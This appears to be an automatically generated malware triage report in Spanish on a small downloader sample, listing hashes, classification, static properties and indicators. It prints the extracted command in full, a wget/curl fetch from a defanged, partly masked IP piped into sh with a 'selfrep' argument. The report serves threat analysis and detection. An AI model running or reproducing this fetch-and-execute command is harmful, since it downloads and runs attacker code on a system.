# 🧬 Payload Analysis

`dcaf3d65abb41463b2f8dfc24247cb572f7d2ec0560878c9bfa3a500a894ce9f`

## 📌 Resumen

Texto ASCII de 369 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `sh` en `hxxps://14.46.136.XXX/sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh`
2. `curl -sk hxxps://14.46.136.XXX/sh)`
3. `sh -s apache.selfrep` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/dcaf3d65abb41463b2f8dfc24247cb572f7d2ec0560878c9bfa3a500a894ce9f.md](../../../../../malware-like/oraculo/downloader/dcaf3d65abb41463b2f8dfc24247cb572f7d2ec0560878c9bfa3a500a894ce9f.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:44:37.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `dcaf3d65abb41463b2f8dfc24247cb572f7d2ec0560878c9bfa3a500a894ce9f`
- **SHA1:** `3cf7393e5fc8beecf1331b801c4d3cadf0a7c001`
- **MD5:** `fab766f26494aa76cdea4cdfc9ebb500`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 369 B |
| Entropía | 5.14 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrep
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh | strings |
| url | hxxps://14.46.136.XXX/sh) | strings |
| ip | 190.179.166.XXX | static_analysis |
| ip | 14.46.136.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrep | strings |
| hash | dcaf3d65abb41463b2f8dfc24247cb572f7d2ec0560878c9bfa3a500a894ce9f | static_analysis |
| ip | 211.62.61.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
